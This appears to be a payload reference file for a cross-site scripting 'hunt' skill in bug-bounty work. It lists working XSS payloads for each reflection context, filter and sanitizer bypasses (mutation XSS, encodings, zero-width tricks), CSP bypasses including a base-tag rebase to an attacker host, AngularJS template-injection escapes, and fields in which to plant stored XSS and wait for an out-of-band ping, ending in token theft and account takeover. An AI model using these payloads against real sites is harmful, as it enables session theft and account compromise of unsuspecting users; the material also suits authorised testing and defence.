# XSS — Payload & Context Atlas (exhaustive)

Companion to `hunt-xss`. The main skill carries the *method* (canary, context classification,
OOB for stored) and 6 composition chains. This file is the **payload matrix** — every context ×
bypass shape — so you stop hand-crafting and start enumerating the right payload for the sink.

## 1. Context → first payload (map the reflection before choosing)

| reflection context | first probe | tell |
|---|---|---|
| raw HTML body | `<script>alert(1)</script>` | `<` unescaped = inline XSS |
| attribute (double-quoted) | `" autofocus onfocus=alert(1) x="` | breaks out of `value="..."` |
| attribute (single-quoted) | `' autofocus onfocus=alert(1) x='` | same, single quote |
| URL / href | `javascript:alert(1)` | scheme not blocked |
| JS string | `';alert(1)//` or `';alert(1);'` | breaks out of `var x='...'` |
| JS context (DOM) | `';alert(document.domain)//` | sink = innerHTML/eval/etc |
| `<title>` / RCDATA | reflection is INERT | confirm it's actually in body too |
| markdown render | `[x](javascript:alert(1))` | link scheme |
| JSON in `<script>` | `</script><script>alert(1)</script>` | framework serializes `<`? |

## 2. Event-handler / tag atlas (WAF-visible payloads often blocked; these slip)

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```

## 3. mXSS (mutation XSS) — sanitizer parse ≠ browser re-parse

```
<math><style><img src=x onerror=alert(1)></style></math>
<svg><style><img src=x onerror=alert(1)></style></svg>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```
Fingerprint the sanitizer VERSION first (DOMPurify/CVE-bypass builds differ); a
`<selected>`-based DOMPurify bypass (CVE-2026-47423) only works on the affected version.

## 4. CSP bypass payloads

```
# JSONP on allowed CDN → external method
<script src="https://allowed-cdn.com/api/jsonp?callback=alert(1)"></script>
# script gadgets (AngularJS ng-app/sub, bootstrap + JS)
# base-tag rebasing:  <base href="//attacker/">   then relative <script src=x.js>
# SVG served as image/svg+xml often NOT covered by the page CSP
# <link rel=preload as=script href=...> when script-src permissive
```

## 5. Obfuscation / filter-evasion

```
<script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>                              # case
<svg onload=eval(atob('YWxlcnQoMSk='))>                 # base64
<script>ale\u0072t(1)</script>                         # unicode escape in JS
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">  # numeric entities in attribute
<svg onload=/*comment*/alert(1)>
<a href="java&#115;cript:alert(1)">x</a>               # entity in scheme
<a href="javascript​:alert(1)">x</a>                    # zero-width space
java%73cript:alert(1)                                   # %-encoded scheme
```

## 6. AngularJS CSTI → XSS (legacy <1.6)

```
{{7*7}} → 49 in a page with ng-app = AngularJS evaluating
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}                    # common escape
# no $eval + no string literals → charAt-overwrite + orderBy + fromCharCode
# (see hunt-xss main file for the full structure)
```

## 7. Stored XSS carrier list (plant these and wait for the OOB ping)

```
profile bio/display_name, username, org name, label color, ticket title,
support reply, wiki/issue comment, SVG avatar, file filename, email address field,
User-Agent (if SOC renders it), Referer, error-message param (?ErrorMessage=)
```

## 8. Escalation rung

```
rung 1  reflected, attacker must craft link + victim clicks     → Low-Medium
rung 2  stored, low-priv context (any viewer)                   → Medium
rung 3  stored, admin/privileged viewer                          → High
rung 4  stored on signin/SSO origin + token theft (OOB)          → Critical (chain ATO)
```
Context + delivery + who-sees-it decide severity; the 6 chains in the main skill turn
JavaScript into ATO.